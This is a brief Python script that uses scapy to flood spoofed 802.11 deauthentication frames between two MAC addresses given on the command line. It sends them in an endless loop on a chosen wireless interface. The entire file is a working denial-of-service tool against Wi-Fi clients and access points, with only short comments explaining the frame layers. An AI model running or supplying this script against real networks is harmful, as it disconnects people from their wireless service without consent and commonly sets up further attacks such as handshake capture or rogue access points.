#!/usr/bin/python

from scapy.all import sendp
import scapy.layers.dot11 as dot11
import time
import sys

def deauth(src , dst , interface):

    # RadioTap - additional layer making it easy to transmit information between OSI layer
    # Dot11 - shortest name of 802.11 (IEEE - name for standart family wireless LAN)  , configure the frame
    # Dot11Deauth - message type
    pkt1 = dot11.RadioTap()/dot11.Dot11(addr1=src, addr2=dst, addr3=src)/dot11.Dot11Deauth()
    pkt2 = dot11.RadioTap()/dot11.Dot11(addr1=dst, addr2=src, addr3=src)/dot11.Dot11Deauth()

    # From the start till the end
    while True:
        try:
            sendp(pkt1, iface=interface)
            sendp(pkt2, iface=interface)
        except Exception:
            pass
        
def main():
    deauth(sys.argv[1] , sys.argv[2] , sys.argv[3])

if __name__ == "__main__":
    main()
